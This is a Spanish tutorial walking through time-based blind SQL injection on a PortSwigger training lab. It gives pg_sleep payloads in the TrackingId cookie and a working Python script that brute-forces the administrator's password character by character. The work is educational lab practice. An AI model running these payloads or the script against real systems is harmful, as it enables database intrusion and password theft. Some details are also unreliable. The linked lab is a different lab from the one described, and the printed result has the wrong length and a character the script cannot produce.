
---
# Guía práctica: SQLi Blind — con retrasos y exfiltración de datos

---

## Laboratorio PortSwigger

Para ilustrar con ejemplos reales usaremos el laboratorio gratuito de [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses):

`https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses`

Todas las pruebas que se muestran a continuación se realizaron contra la URL provista por ese laboratorio.

---

## Confirmación de la vulnerabilidad

**Resumen:** en este laboratorio la entrada vulnerable es la cookie `TrackingId`. Para confirmarlo interceptamos peticiones con Burp Suite y observamos el valor de la cookie en la cabecera `Cookie`. También se puede ver con DevTools (`Ctrl+Shift+I`).

**Paso práctico (comprobación rápida):**

1. Intercepta una petición con Burp (o abre DevTools).
    
2. Localiza la cabecera `Cookie: TrackingId=...`.
    
3. Modifica temporalmente el valor añadiendo una comilla simple (`'`) al final:  
	 `TrackingId=G1KUuxbiLkvBBAT5'`

4. Reenviamos la petición y comparamos la respuesta con la original. En este laboratorio, al añadir la carga que fuerza un _sleep_ (por ejemplo `' sleep(5)` o una variante válida según el motor) observamos un **retraso de ~5 segundos** en la respuesta. Esto nos indica que la entrada está afectando a la consulta SQL y que la aplicación evalúa una condición en el backend: **confirmamos comportamiento condicional** y, por tanto, la vulnerabilidad.


[Ver Delay - sleep](Delay%20-%20sleep.md)


> Observación práctica: cuando detectemos un retraso reproducible y controlado asociado a una modificación en la entrada (sin error visible en la página), tenemos evidencia consistente de _blind SQLi_ basada en tiempos.

---

## Tipo de inyección

**Tipo identificado:** _Blind SQL Injection — time-based (inyección ciega basada en tiempos)._

**Explicando diferencias:**

- En la _time-based blind SQLi_ la aplicación **no devuelve mensajes de error ni contenido filtrado** que nos diga directamente si una condición SQL es verdadera o falsa. En lugar de ello, el atacante (o el tester) induce una operación que provoca un **retraso temporal** en la ejecución de la consulta cuando la condición es verdadera.
    
- Es útil cuando la salida de la consulta está totalmente suprimida o cuando la aplicación normaliza la respuesta y no revela diferencias de contenido. Mediante la medición del tiempo de respuesta (p. ej. sleep, pg_sleep, benchmark, WAITFOR DELAY según el SGBD), podemos inferir bits de información del backend de forma bit a bit.
    

**Cómo distinguirlo de otras variantes (resumen):**

- _Boolean-based blind:_ la respuesta cambia en el contenido (por ejemplo distinta longitud, redirección o presencia/ausencia de un texto) según la condición SQL.
    
- _Time-based blind:_ la respuesta se mantiene aparentemente igual en contenido, pero **el tiempo de respuesta varía** de forma controlada.


---

## Explotación

```SQL
'||pg_sleep(5)--
```

Explicación: al introducir esta query propia del moto [PostgreSQL](PostgreSQL.md), vemos que la página tarda aproximadamente 5 segundos en responder. Por lo que tenemos una forma potencial de extraer información de la base de datos. Ya que como comprobaremos a continuación. Cuando la página responde a inyecciones basadas en tiempo. Podemos igualar ciertas condiciones como la de el primer carácter de la contraseña de 'administrator' es X, si es cierto se aplicará `sleep(5)` si no la respuesta será inmediata.

```SQL
'%3b select pg_sleep(5)--
```

`%3b` = `;` ---> representación URL-encoded (valor hexadecimal de `;`)

Explicación:

- El uso del `;` permite **ejecutar una consulta independiente** (stacked query). Eso simplifica pruebas porque no necesitamos encajar la inyección dentro de la estructura sintáctica de la consulta original.
    
- Inducir retrasos nos permite inferir información bit a bit (por ejemplo, comprobando si el n-ésimo bit del nombre de usuario es 1 provocando un sleep cuando la condición es verdadera).

Comprobamos el mecanismo: inyectamos una condición siempre verdadera (1=1). Si la petición tarda ~5 s, confirmamos que la inyección se ejecuta y que el servidor admite la sentencia inyectada:
```SQL
'%3b select case when(1=1) then pg_sleep(5) else pg_sleep(0) end--
```

Comprobamos existencia directa: evaluamos por cada fila si `username='administrator'`; si existe alguna fila que cumpla, la consulta debería provocar el `sleep`. Si no vemos retraso, puede deberse a comillas mal cerradas, sensibilidad a mayúsculas o a que la condición no devuelve filas:
```SQL
'%3b select case when(username='administrator') then pg_sleep(5) else pg_sleep(0) end from users--
```

Refinamos la condición. Verificamos que además del usuario exista una contraseña de 20 caracteres. Así convertimos la comprobación en una prueba booleana más específica antes de inducir el retraso:
```SQL
'%3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users--
```

Empezamos la extracción bit a bit: comprobamos si la primera letra de la contraseña del administrador es `d`. Si la condición es verdadera provocará el `sleep`, y usamos esto para inferir caracteres de la contraseña repetidamente:
```SQL
'%3b select case when(username='administrator' and substring(password,1,1)='d') then pg_sleep(5) else pg_sleep(0) end from users--
```


---

## Script

```python
#!/usr/bin/env python3

from pwn import *
import requests, sys, signal, string, time

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...\n")
    p1.failure("Ataque detenido")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLi")

def makeSQLi():

    password = ""

    p1.status("Iniciando ataque de fuera bruta")
    time.sleep(2)

    p2 = log.progress("Password")

    for position in range (1, 21):
        for character in characters:
            cookies= {
                'TrackingId': f"nNCar1hXkXyVWKKD'%3b select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(2) else pg_sleep(0) end from users--",
                'session': "cIhyWb1WJykwx1Cy66qctlWEY0tHyuMy"
            }

            p1.status(f"Pos {position} probando '{character}'")

            r = requests.get("https://0af800a80464eb21853f806c00cc0071.web-security-academy.net/", cookies=cookies)

            # Cambio mínimo: usamos elapsed.total_seconds() en lugar de medir con time.time()
            if r.elapsed.total_seconds() > 2:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLi()
```

Resultado:

```bash
[↑] Password: dmaihnlkn43lnwñsa
```


---

### Por qué usar `Pos {position} probando '{character}'` vs `p1.status(cookies["TrackingId"])`

- Usamos una cadena corta y controlada porque **evita el wrapping** en el terminal.

- `log.progress().status()` sobrescribe la misma línea; si pintamos una cadena muy larga (la cookie completa) el terminal la divide en varias líneas y da la impresión de “historial” en lugar de una única línea actualizada.

- Mostrar solo la posición y el carácter **mejora la legibilidad**: vemos claramente qué prueba está en curso sin inundar la consola con payloads largos.

- Es más seguro: **no mostramos la carga completa** en claro en la UI, lo que reduce riesgo de filtrar payloads accidentales en logs o capturas de pantalla.

- Es el cambio **mínimo y suficiente** para obtener una salida limpia y el mismo comportamiento funcional.


### Por qué usar `r.elapsed.total_seconds()` vs `time.time()`

- `r.elapsed.total_seconds()` nos da **el tiempo real medido por la librería requests** entre envío y recepción de la respuesta (incluye tiempo de transfer y procesamiento por el servidor hasta que la respuesta empieza a ser leída).

- `time.time()` mide el tiempo wall-clock entre dos llamadas en nuestro proceso: puede incluir tiempo de CPU local, bloqueo de hilo, scheduling del sistema o cualquier otra latencia local que no provenga del servidor.

- `r.elapsed` es más **preciso y específico** para detectar delays inducidos por `pg_sleep()` en el servidor; reduce falsos positivos/negativos causados por fluctuaciones locales.

- `r.elapsed` refleja el **tiempo observado por la librería HTTP**, mientras que `time.time()` es una medida general del sistema (más ruidosa).

- Complementamos `r.elapsed` con `timeout` en la petición y con un **umbral razonable** (o repetir y usar la mediana) para evitar detecciones erróneas por jitter de red.


---
